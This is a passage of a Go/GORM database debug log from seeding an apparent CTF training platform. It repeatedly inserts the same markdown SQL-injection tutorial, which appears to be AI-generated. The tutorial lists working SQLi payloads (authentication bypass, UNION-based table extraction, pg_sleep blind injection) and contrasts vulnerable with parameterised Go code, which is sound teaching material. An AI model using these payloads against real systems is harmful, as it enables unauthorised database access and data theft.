### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,84) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.337ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[12.093ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.33','2025-06-09 14:07:55.33',NULL,'cyber security and eyoal','XTmCvInCHgSYyOeCSIsEkKewJWAfHSlntMUxijAndxxbRuVmSxPFilQqYvHsDnIRhuXFhdiUxqGVjrbzBUdaafmKrhPnhtwJCNWU',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.488ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.482ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 85 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.462ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.34','2025-06-09 14:07:55.34',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,85) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.586ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[9.562ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.351','2025-06-09 14:07:55.351',NULL,'cyber security and xqscc','DuBsUdYqYtaIzuUffGVZNfoJNjJjeyMNujrpnPjdpaXDKAoqpzwyYqbSoixKMjFggPKwwkFHQLNvZwmlXQcthgOOWBFMqSidZwFD',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.515ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.508ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 86 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[8.926ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.358','2025-06-09 14:07:55.358',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,86) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.394ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[13.166ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.371','2025-06-09 14:07:55.371',NULL,'cyber security and nuzeb','GmIksyCMcEyGasSSaPFkJaXnMmwiemBmQLZgINVTWcOVYZMNuGIMhUcKqhRaDFaIKmebOFELUqLzlchTilhBrgYQYaPoikwFYjeI',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.542ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.508ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 87 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[8.473ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.38','2025-06-09 14:07:55.38',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,87) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.493ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[8.486ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.388','2025-06-09 14:07:55.388',NULL,'cyber security and ceexq','EoddDYdHrnWJOYhyWLVXDQeVaMwFeivMgnMYZOoYbAFmOLNEMYHcdgecxGazPEVUOZqtqzGcwxGRYRHHceijjDVLkDUGoaXnffih',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.503ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.539ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 88 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.558ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.397','2025-06-09 14:07:55.397',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,88) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.423ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[9.179ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.405','2025-06-09 14:07:55.405',NULL,'cyber security and hczkr','JVfKjmZrySNzxAHoFoUFbWIQJvUzLwihbfGNhWALSQgMDWWTKjIUXDhaCByJFAOoRnvEfkNFyJbehdIkeIvlpRsNGWlFrwfxtuJO',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.559ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.474ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 89 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[10.139ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.414','2025-06-09 14:07:55.414',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

